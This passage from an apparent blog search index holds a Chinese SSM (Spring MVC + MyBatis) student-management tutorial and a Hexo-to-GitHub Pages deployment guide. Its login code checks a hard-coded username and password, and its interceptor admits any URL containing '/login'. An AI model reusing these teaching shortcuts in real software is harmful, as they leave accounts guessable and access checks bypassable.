Spring MVC 中的 Controller 类和 JSP 页面 Controller 类主要负责拦截用户请求，并调用业务逻辑层中相应组件的业务逻辑方法来处理用户请求，然后将相应的结果返回给 JSP 页面. 下面通过一张图来描述各个层次的关系和作用，如图所示 文件组织结构 数据库设计123456789101112131415161718192021222324mysql -uroot -p123show database;show variables like &quot;%char%&quot;; //查看编码格式create database db_zfy ;use db_zfy ;desc students; //查看表结构drop table tb_person; //删除表delete from tb_person where id=4; //删除表内容create table tb_product(id int (32) primary key auto_increment,name varchar(32),price double);insert into tb_product values(&#x27;1&#x27;,&#x27;java基础入门&#x27;,&#x27;44.5&#x27;);alter table tb_person convert to character set utf8; // 修改表的字符编码集 系统环境搭建JAR包 1.Spring框架所需的10个 • aopalliance-1.0.jar• aspectjweaver -1.8.1 O.jar• spring-aop-4.3.6.RELEASE.jar• spring-aspects-4.3.6.RELEASE.jar• spring-beans-4.3.6.RELEASE.jar• spring-context-4.3.6.RELEASE.jar • spring-core-4 .3.6.RELEASE.jar • spring-expression-4 . 3 . 6 .RELEASE.jar • spring-:-jdbc-4.3 .6.RELEASE.jar • spring-tx-4 . 3 .6.RELEASE .jar Spring MVC 框架所需要的 JAR (2 个) • spring-web-4.3 . 6 .RELEASE.jar • spring-webmvc-4 .3.6 .RELEASE .jar MyBatis 框架所需的 JAR (13 个) ​ 主要包括核心包 mybatis-3 .4 2.jar ，以及其解压文件夹中 lib 目录下的所有 JAR • ant-1 . 9 . 6 .jar • ant-launcher-1.9.6 .jar • asm-5 . 1 .jar • cglib-3 . 2.4 .jar • commons-logging-1.2 .jar . • javassist-3 .21 .0-GA.jar • log4j-1.2.17 .jar • log4j-api-2 .3.jar • log4j-core-2 . 3 .jar • mybatis-3.4.2 .jar • ognl-3 . 1 .12.jar • slf4j-api-1 . 7 .22 .jar • slf4j-log4j12-1 . 7 .22 .jar MyBatis —Spring 整舍的中间 JAR (1 个) • mybatis-spring-1 . 3 . 1 .jar 数据库驱动 JAR 包( 个) • mysql-connector-java-5 . 1.40-bin .jar 数据源 dbcp 所需 JAR (2 个) • commons-dbcp2-2 . 1 . 1 .jar • commons-pooI2-2.4 . 2 .jar JSTL 标签库 JAR (2 个) • taglibs-standard-impl-1.2.5 .jar • taglibs-standard-spec-1 .2.5.jar Jackson 框架所需 JAR (3 个) • ja ckson-annotations-2.8 . 6 .jar • jack son-core - 2.8 . 6 .jar • jackson-databind-2 .8.6 .jar Java 工具类 JAR (1 个) • common s-lang3-3.4 .jar 持久化类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package cn.zfy.eft.exp3.ssm.po;public class Students &#123; private Integer id; //主键id private String name; private Integer age; private String gender; private String number; private String address; private Integer status;//激活状态 public Integer getId() &#123; return id; &#125; public void setId(Integer id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Integer getAge() &#123; return age; &#125; public void setAge(Integer age) &#123; this.age = age; &#125; public String getGender() &#123; return gender; &#125; public void setGender(String gender) &#123; this.gender = gender; &#125; public String getNumber() &#123; return number; &#125; public void setNumber(String number) &#123; this.number = number; &#125; public String getAddress() &#123; return address; &#125; public void setAddress(String address) &#123; this.address = address; &#125; public Integer getStatus() &#123; return status; &#125; public void setStatus(Integer status) &#123; this.status = status; &#125; @Override public String toString() &#123; return &quot;Students [id=&quot; + id + &quot;, name=&quot; + name + &quot;, age=&quot; + age + &quot;, gender=&quot; + gender + &quot;, number=&quot; + number + &quot;, address=&quot; + address + &quot;, status=&quot; + status + &quot;]&quot;; &#125; &#125; DAO层123456789101112131415161718192021222324252627package cn.zfy.eft.exp3.ssm.dao;import java.util.List;import cn.zfy.eft.exp3.ssm.po.Students;/** * 学生信息接口文件 * */public interface StudentsDao &#123; public Students findStudentsById(Integer id); public int deleteStudentsById(Integer id); public void addStudents(Students students); public void updateStudentsById(Students students); public List&lt;Students&gt; findall();&#125; DAO的映射：12345678910111213141516171819202122232425262728293031323334&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;cn.zfy.eft.exp3.ssm.dao.StudentsDao&quot;&gt; &lt;!-- 查询学生信息 --&gt; &lt;select id=&quot;findStudentsById&quot; parameterType=&quot;Integer&quot; resultType=&quot;Students&quot;&gt; select * from students where Id= #&#123;id&#125; &lt;/select&gt; &lt;!-- 查询所有学生信息 --&gt; &lt;select id=&quot;findall&quot; resultType=&quot;Students&quot;&gt; select * from students &lt;/select&gt; &lt;!-- 删除信息 --&gt; &lt;delete id=&quot;deleteStudentsById&quot; parameterType=&quot;Integer&quot;&gt; delete from students where Id=#&#123;id&#125; &lt;/delete&gt; &lt;!-- 更新信息 --&gt; &lt;update id=&quot;updateStudentsById&quot; parameterType=&quot;Students&quot;&gt; update students set name=#&#123;name&#125;,age=#&#123;age&#125;,gender=#&#123;gender&#125;,number=#&#123;number&#125;,address=#&#123;address&#125;,status=#&#123;status&#125; where Id=#&#123;id&#125; &lt;/update&gt; &lt;!-- 增加信息 --&gt; &lt;insert id=&quot;addStudents&quot; parameterType=&quot;Students&quot;&gt; insert into students(name,age,gender,number,address,status) values(#&#123;name&#125;,#&#123;age&#125;,#&#123;gender&#125;,#&#123;number&#125;,#&#123;address&#125;,#&#123;status&#125;) &lt;/insert&gt;&lt;/mapper&gt; Service：123456789101112131415161718192021package cn.zfy.eft.exp3.ssm.service;import java.util.List;import cn.zfy.eft.exp3.ssm.po.Students;public interface StudentsService &#123; public Students findStudentsById(Integer id); public void addStudents(Students students); public void updateStudentsById(Students students); public int deleteStudentsById(Integer id); public List&lt;Students&gt; findall(); &#125; Service的接口实现：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package cn.zfy.eft.exp3.ssm.service.Impl;import java.util.List;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Service;import org.springframework.transaction.annotation.Transactional;import cn.zfy.eft.exp3.ssm.dao.StudentsDao;import cn.zfy.eft.exp3.ssm.po.Students;import cn.zfy.eft.exp3.ssm.service.StudentsService;@Service@Transactionalpublic class StudentsServiceImpl implements StudentsService &#123; // 注解注入StudentsDao @Autowired private StudentsDao studentsDao; public void setStudentsDao(StudentsDao studentsDao) &#123; this.studentsDao = studentsDao; &#125; @Override public Students findStudentsById(Integer id) &#123; return this.studentsDao.findStudentsById(id); &#125; //删除信息 @Override public int deleteStudentsById(Integer id) &#123; int row = studentsDao.deleteStudentsById(id); System.out.println(row); return row; &#125; //更新信息 @Override public void updateStudentsById(Students students) &#123; studentsDao.updateStudentsById(students); &#125; //添加信息 @Override public void addStudents(Students students) &#123; // TODO 自动生成的方法存根 studentsDao.addStudents(students); &#125; //列表信息 @Override public List&lt;Students&gt; findall() &#123; // TODO 自动生成的方法存根 return this.studentsDao.findall(); &#125;&#125; Controller：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package cn.zfy.eft.exp3.ssm.controller;import java.util.List;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.servlet.ModelAndView;import cn.zfy.eft.exp3.ssm.po.Students;import cn.zfy.eft.exp3.ssm.service.StudentsService;@Controllerpublic class StudentsController &#123; @Autowired private StudentsService studentsService; /** * 根据id查学生详情 */ @RequestMapping(&quot;/findStudentsById&quot;) public String findStudentsById(Integer id, Model model) &#123; Students students = studentsService.findStudentsById(id); model.addAttribute(&quot;students&quot;, students); // 返回学生信息展示页面 return &quot;students&quot;; &#125; // 删除信息 @RequestMapping(&quot;/deleteStudentsById&quot;) public String deleteStudentById(Integer id, Model model) &#123; int row = studentsService.deleteStudentsById(id); if (row &gt; 0) return &quot;success&quot;; else return &quot;fail&quot;; &#125; // 修改信息 @RequestMapping(&quot;/updateStudentsById&quot;) public String updateStudentsById(Students students, Model model) &#123; studentsService.updateStudentsById(students); return &quot;success&quot;; &#125; @RequestMapping(&quot;/addStudents&quot;) public String addStudentsById(Students students,Model model)&#123; studentsService.addStudents(students); return &quot;success&quot;; &#125; @RequestMapping(&quot;/findall&quot;) public ModelAndView stuList() &#123; ModelAndView modelAndView = new ModelAndView(); List&lt;Students&gt; list; list = studentsService.findall(); modelAndView.addObject(&quot;students&quot;, list); modelAndView.setViewName(&quot;studentsindex&quot;); return modelAndView; &#125; @RequestMapping(&quot;/addStudentsindex&quot;) public String addStudentsindex() &#123; return &quot;addStudents&quot;; &#125; @RequestMapping(&quot;/updateStudents&quot;) public String updateStudents(Integer id, Model model) &#123; Students students = studentsService.findStudentsById(id); model.addAttribute(&quot;students&quot;, students); return &quot;updateStudents&quot;; &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960package cn.zfy.eft.exp3.ssm.controller;import javax.servlet.http.HttpSession;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import cn.zfy.eft.exp3.ssm.po.User;@Controllerpublic class UserController &#123; /** * 向用户登录页面跳转 */ @RequestMapping(value=&quot;/login&quot;,method=RequestMethod.GET) public String toLogin() &#123; return &quot;login&quot;; &#125; /** * 用户登录 */ @RequestMapping(value=&quot;/login&quot;,method=RequestMethod.POST) public String login(User user,Model model,HttpSession session) &#123; // 获取用户名和密码 String username = user.getUsername(); String password = user.getPassword(); // 此处模拟从数据库中获取用户名和密码后进行判断 if(username != null &amp;&amp; username.equals(&quot;zhufuyi&quot;) &amp;&amp; password != null &amp;&amp; password.equals(&quot;123456&quot;))&#123; // 将用户对象添加到Session session.setAttribute(&quot;USER_SESSION&quot;, user); // 重定向到主页面的跳转方法 return &quot;redirect:main&quot;; &#125; model.addAttribute(&quot;msg&quot;, &quot;用户名或密码错误，请重新登录！&quot;); return &quot;login&quot;; &#125; /** * 向用户主页面跳转 */ @RequestMapping(value=&quot;/main&quot;) public String toMain() &#123; return &quot;main&quot;; &#125; /** * 退出登录 */ @RequestMapping(value = &quot;/logout&quot;) public String logout(HttpSession session) &#123; // 清除Session session.invalidate(); // 重定向到登录页面的跳转方法 return &quot;redirect:login&quot;; &#125;&#125; Interceptor拦截器：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package cn.zfy.eft.exp3.ssm.interceptor;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.ModelAndView;import cn.zfy.eft.exp3.ssm.po.User;/** * 登录拦截器 */public class LoginInterceptor implements HandlerInterceptor&#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; System.out.println(&quot;Logininterceptor------prehandle--------------&quot;); // 获取请求的URL String url = request.getRequestURI(); // URL:除了login.jsp是可以公开访问的，其它的URL都进行拦截控制 if(url.indexOf(&quot;/login&quot;)&gt;=0)&#123; return true; &#125; // 获取Session HttpSession session = request.getSession(); User user = (User) session.getAttribute(&quot;USER_SESSION&quot;); // 判断Session中是否有用户数据，如果有，则返回true,继续向下执行 if(user != null)&#123; return true; &#125; // 不符合条件的给出提示信息，并转发到登录页面 request.setAttribute(&quot;msg&quot;, &quot;您还没有登录，请先登录！&quot;); request.getRequestDispatcher(&quot;/WEB-INF/jsp/login.jsp&quot;) .forward(request, response); return false; &#125; @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123; &#125; @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123; &#125;&#125; 配置文件：applicationContext.xml:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.3.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.3.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.3.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.3.xsd&quot;&gt; &lt;!-- 读取db.properties --&gt; &lt;context:property-placeholder location=&quot;classpath:db.properties&quot; /&gt; &lt;!-- 配置数据源 --&gt; &lt;bean id=&quot;dataSource&quot; class=&quot;org.apache.commons.dbcp2.BasicDataSource&quot;&gt; &lt;!--数据库驱动 --&gt; &lt;property name=&quot;driverClassName&quot; value=&quot;$&#123;jdbc.driver&#125;&quot; /&gt; &lt;!--连接数据库的url --&gt; &lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url&#125;&quot; /&gt; &lt;!--连接数据库的用户名 --&gt; &lt;property name=&quot;username&quot; value=&quot;$&#123;jdbc.username&#125;&quot; /&gt; &lt;!--连接数据库的密码 --&gt; &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot; /&gt; &lt;!--最大连接数 --&gt; &lt;property name=&quot;maxTotal&quot; value=&quot;$&#123;jdbc.maxTotal&#125;&quot; /&gt; &lt;!--最大空闲连接 --&gt; &lt;property name=&quot;maxIdle&quot; value=&quot;$&#123;jdbc.maxIdle&#125;&quot; /&gt; &lt;!--初始化连接数 --&gt; &lt;property name=&quot;initialSize&quot; value=&quot;$&#123;jdbc.initialSize&#125;&quot; /&gt; &lt;/bean&gt; &lt;!-- 事务管理器，依赖于数据源 --&gt; &lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt; &lt;/bean&gt; &lt;!-- 开启事务注解 --&gt; &lt;tx:annotation-driven transaction-manager=&quot;transactionManager&quot; /&gt; &lt;!-- 配置MyBatis工厂SqlSessionFactory --&gt; &lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt; &lt;!--注入数据源 --&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt; &lt;!--指定核MyBatis心配置文件位置 --&gt; &lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis-config.xml&quot; /&gt; &lt;/bean&gt; &lt;!-- 配置mapper扫描器 --&gt; &lt;bean class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt; &lt;property name=&quot;basePackage&quot; value=&quot;cn.zfy.eft.exp3.ssm.dao&quot; /&gt; &lt;/bean&gt; &lt;!-- 扫描Service --&gt; &lt;context:component-scan base-package=&quot;cn.zfy.eft.exp3.ssm.service&quot; /&gt;&lt;/beans&gt; mabatis-config.xml:12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt; &lt;!-- 别名定义 --&gt; &lt;typeAliases&gt; &lt;package name=&quot;cn.zfy.eft.exp3.ssm.po&quot; /&gt; &lt;/typeAliases&gt;&lt;/configuration&gt; springmvc-config.xml:123456789101112131415161718192021222324252627282930&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.3.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-4.3.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.3.xsd&quot;&gt; &lt;!-- 配置包扫描器，扫描@Controller注解的类 --&gt; &lt;context:component-scan base-package=&quot;cn.zfy.eft.exp3.ssm.controller&quot; /&gt; &lt;!-- 加载注解驱动 --&gt; &lt;mvc:annotation-driven /&gt; &lt;!-- 配置视图解析器 --&gt; &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot; /&gt; &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt; &lt;/bean&gt; &lt;!--配置拦截器 --&gt; &lt;mvc:interceptors&gt; &lt;mvc:interceptor&gt; &lt;mvc:mapping path=&quot;/**&quot; /&gt; &lt;bean class=&quot;cn.zfy.eft.exp3.ssm.interceptor.LoginInterceptor&quot; /&gt; &lt;/mvc:interceptor&gt; &lt;/mvc:interceptors&gt;&lt;/beans&gt;","categories":[],"tags":[{"name":"SSM","slug":"SSM","permalink":"http://example.com/tags/SSM/"}]},{"title":"hexo+github无法正常访问解决办法","slug":"hexo-github本地预览正常但是部署到github后无法正常访问解决办法","date":"2020-05-22T09:45:53.000Z","updated":"2022-04-08T16:52:17.236Z","comments":true,"path":"2020/05/22/hexo-github本地预览正常但是部署到github后无法正常访问解决办法/","permalink":"http://example.com/2020/05/22/hexo-github%E6%9C%AC%E5%9C%B0%E9%A2%84%E8%A7%88%E6%AD%A3%E5%B8%B8%E4%BD%86%E6%98%AF%E9%83%A8%E7%BD%B2%E5%88%B0github%E5%90%8E%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E8%AE%BF%E9%97%AE%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/","excerpt":"HEXO+GITHUB本地预览正常但是部署到GITHUB后无法正常访问解决办法从注册Github讲起","text":"HEXO+GITHUB本地预览正常但是部署到GITHUB后无法正常访问解决办法从注册Github讲起 HEXO+GITHUB本地预览正常但是部署到GITHUB后无法正常访问解决办法从注册Github讲起 1.创建指定的GITHUB仓库仓库名称和名字必须一样，举栗 Owner:16778738 Repository name:16778738.github.io 注意：Initialize this repository with a README勾选上 点击Create repository 2.确认开启GITHUB PAGES进入settings,找到Github Pages，如下字样 Your site is read to be published at https://16778738.github.io/ 仓库名称以github.io结尾默认开启Github Pages 3.在GITHUB上添加SSH KEYS信息为了能将个人博客服务器上的博客信息推到Github，需要把服务器的SSH Keys信息在Github上添加信任 本地服务器创建ssh-key信息 ssh-keygen -t rsa#遇到等待输入的地方直接Enter,无需其他输入 生成ssh信息后 进入到文件夹 cd .ssh&#x2F; 查看文件夹下id_rsa.pub公钥文件内容 cat id_rsa.pub 将显示的所有内容复制等待粘贴到Github上 4.GITHUB添加SSH KEYSSettings中找到Deploy Keys Add Deploy Keys,将复制的内容粘贴，Title随便写，小勾勾选上 添加成功 5.GITHUB 连接测试ssh -T &#103;&#105;&#116;&#x68;&#x75;&#98;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#x2e;&#99;&#x6f;&#109; 确认连接？YES 最后一行显示成功连接 6.设置你的账号信息git config –global user.name “16778738” git config –global user.email “&#49;&#54;&#55;&#55;&#x38;&#55;&#51;&#56;&#x40;&#113;&#x71;&#x2e;&#x63;&#x6f;&#x6d;“ 7.安装如下扩展npm install hexo-deployer-git –save 8.HEXO部署到 GITHUB PAGESvim _config.yml 找到#Deployment(按一下i进入编辑状态，以下信息编辑完了，Esc键退出输入字符’:wq!’保存退出) deploy:#这行空着 type: git#类型写git #下面接着新加两行 repo: &#x67;&#105;&#x74;&#64;&#103;&#x69;&#116;&#x68;&#x75;&#x62;&#x2e;&#99;&#x6f;&#x6d;:16778738&#x2F;github.io.git branch: master 9.连接成功hexo clean#清理一下 hexo g#生成静态文件 hexo deploy#部署到Github","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://example.com/tags/hexo/"}]}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"渗透测试/后渗透","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"msf","slug":"渗透测试/后渗透/msf","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/"},{"name":"提权","slug":"渗透测试/后渗透/msf/提权","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/%E6%8F%90%E6%9D%83/"},{"name":"信息收集","slug":"渗透测试/信息收集","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"Windows","slug":"渗透测试/后渗透/Windows","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/Windows/"},{"name":"Linux","slug":"渗透测试/后渗透/Windows/Linux","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/Windows/Linux/"},{"name":"免杀","slug":"渗透测试/后渗透/msf/免杀","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/%E5%85%8D%E6%9D%80/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/categories/Linux/"},{"name":"msf","slug":"渗透测试/msf","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/msf/"},{"name":"免杀","slug":"渗透测试/免杀","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"struts2","slug":"漏洞复现/struts2","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/struts2/"},{"name":"xray","slug":"渗透测试/xray","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xray/"},{"name":"Nginx","slug":"Nginx","permalink":"http://example.com/categories/Nginx/"},{"name":"hexo","slug":"hexo","permalink":"http://example.com/categories/hexo/"},{"name":"github","slug":"hexo/github","permalink":"http://example.com/categories/hexo/github/"},{"name":"博客","slug":"hexo/github/博客","permalink":"http://example.com/categories/hexo/github/%E5%8D%9A%E5%AE%A2/"},{"name":"git","slug":"git","permalink":"http://example.com/categories/git/"},{"name":"Docker","slug":"Docker","permalink":"http://example.com/categories/Docker/"},{"name":"内网安全","slug":"渗透测试/内网安全","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"},{"name":"redis","slug":"redis","permalink":"http://example.com/categories/redis/"}],"tags":[{"name":"华为交换机","slug":"华为交换机","permalink":"http://example.com/tags/%E5%8D%8E%E4%B8%BA%E4%BA%A4%E6%8D%A2%E6%9C%BA/"},{"name":"路由器;交换机","slug":"路由器-交换机","permalink":"http://example.com/tags/%E8%B7%AF%E7%94%B1%E5%99%A8-%E4%BA%A4%E6%8D%A2%E6%9C%BA/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"},{"name":"java","slug":"java","permalink":"http://example.com/tags/java/"},{"name":"加密编码算法","slug":"加密编码算法","permalink":"http://example.com/tags/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/"},{"name":"web攻防,asp","slug":"web攻防-asp","permalink":"http://example.com/tags/web%E6%94%BB%E9%98%B2-asp/"},{"name":"安卓逆向","slug":"安卓逆向","permalink":"http://example.com/tags/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"},{"name":"MAC收藏","slug":"MAC收藏","permalink":"http://example.com/tags/MAC%E6%94%B6%E8%97%8F/"},{"name":"waf","slug":"waf","permalink":"http://example.com/tags/waf/"},{"name":"网络安全学习","slug":"网络安全学习","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"安卓,docker,termux","slug":"安卓-docker-termux","permalink":"http://example.com/tags/%E5%AE%89%E5%8D%93-docker-termux/"},{"name":"gpt4","slug":"gpt4","permalink":"http://example.com/tags/gpt4/"},{"name":"收藏网站","slug":"收藏网站","permalink":"http://example.com/tags/%E6%94%B6%E8%97%8F%E7%BD%91%E7%AB%99/"},{"name":"euserv,永久免费服务器","slug":"euserv-永久免费服务器","permalink":"http://example.com/tags/euserv-%E6%B0%B8%E4%B9%85%E5%85%8D%E8%B4%B9%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"firewalld","slug":"firewalld","permalink":"http://example.com/tags/firewalld/"},{"name":"docker,wsl","slug":"docker-wsl","permalink":"http://example.com/tags/docker-wsl/"},{"name":"scoop","slug":"scoop","permalink":"http://example.com/tags/scoop/"},{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"后渗透","permalink":"http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"提权","slug":"提权","permalink":"http://example.com/tags/%E6%8F%90%E6%9D%83/"},{"name":"信息收集","slug":"信息收集","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"免杀","slug":"免杀","permalink":"http://example.com/tags/%E5%85%8D%E6%9D%80/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"struts2","slug":"struts2","permalink":"http://example.com/tags/struts2/"},{"name":"xray","slug":"xray","permalink":"http://example.com/tags/xray/"},{"name":"Nginx","slug":"Nginx","permalink":"http://example.com/tags/Nginx/"},{"name":"hexo","slug":"hexo","permalink":"http://example.com/tags/hexo/"},{"name":"github","slug":"github","permalink":"http://example.com/tags/github/"},{"name":"博客","slug":"博客","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"git","slug":"git","permalink":"http://example.com/tags/git/"},{"name":"Docker端口映射","slug":"Docker端口映射","permalink":"http://example.com/tags/Docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/"},{"name":"Docker","slug":"Docker","permalink":"http://example.com/tags/Docker/"},{"name":"Cobalt Strike","slug":"Cobalt-Strike","permalink":"http://example.com/tags/Cobalt-Strike/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"cve","slug":"cve","permalink":"http://example.com/tags/cve/"},{"name":"weblogic","slug":"weblogic","permalink":"http://example.com/tags/weblogic/"},{"name":"靶机","slug":"靶机","permalink":"http://example.com/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"JNDI-Injection-Exploit","slug":"JNDI-Injection-Exploit","permalink":"http://example.com/tags/JNDI-Injection-Exploit/"},{"name":"nmap","slug":"nmap","permalink":"http://example.com/tags/nmap/"},{"name":"xss","slug":"xss","permalink":"http://example.com/tags/xss/"},{"name":"挖洞","slug":"挖洞","permalink":"http://example.com/tags/%E6%8C%96%E6%B4%9E/"},{"name":"万能密码","slug":"万能密码","permalink":"http://example.com/tags/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/"},{"name":"openssl","slug":"openssl","permalink":"http://example.com/tags/openssl/"},{"name":"wpscan","slug":"wpscan","permalink":"http://example.com/tags/wpscan/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/tags/CVE/"},{"name":"Kindeditor","slug":"Kindeditor","permalink":"http://example.com/tags/Kindeditor/"},{"name":"beef","slug":"beef","permalink":"http://example.com/tags/beef/"},{"name":"内网渗透","slug":"内网渗透","permalink":"http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"cs","slug":"cs","permalink":"http://example.com/tags/cs/"},{"name":"kali","slug":"kali","permalink":"http://example.com/tags/kali/"},{"name":"PhpMyAdmin","slug":"PhpMyAdmin","permalink":"http://example.com/tags/PhpMyAdmin/"},{"name":"centos","slug":"centos","permalink":"http://example.com/tags/centos/"},{"name":"centos8","slug":"centos8","permalink":"http://example.com/tags/centos8/"},{"name":"-go","slug":"go","permalink":"http://example.com/tags/go/"},{"name":"命令","slug":"命令","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4/"},{"name":"namp","slug":"namp","permalink":"http://example.com/tags/namp/"},{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"面试题","s